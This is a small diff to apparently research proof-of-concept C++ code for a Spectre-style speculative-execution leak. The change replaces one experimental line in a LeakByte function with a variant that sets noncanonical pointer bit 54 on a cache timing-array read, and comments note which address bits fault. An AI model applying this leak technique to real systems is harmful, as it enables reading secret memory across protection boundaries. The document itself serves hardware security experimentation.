@@ -86,9 +86,13 @@ static char LeakByte(const char *data, size_t offset) {
         // const void *ptr = &timing_array[data[local_offset]] + (1ULL << 50);
         // asm volatile("prfm pldl1keep, [%0]" :: "r" (ptr) : "memory");
 
-        // However, it doesn't seem like speculative execution can continue subsequently.
-        char index = *(data + local_offset + !static_cast<bool>((i + 1) % 2048) * (1ULL << 50));
-        ForceRead(&timing_array[index]);
+        // // However, it doesn't seem like speculative execution can continue subsequently.
+        // char index = *(data + local_offset + !static_cast<bool>((i + 1) % 2048) * (1ULL << 50));
+        // ForceRead(&timing_array[index]);
+
+        // Which noncanonical bits cause segfault?
+        // Setting bits 48-53 do. 54 and up can be set and architecturally deref'd.
+        ForceRead(&timing_array[data[local_offset]] + (1ULL << 54));
 
         // // Below is plain old spectre-v1.
         // ForceRead(&timing_array[data[local_offset]]);
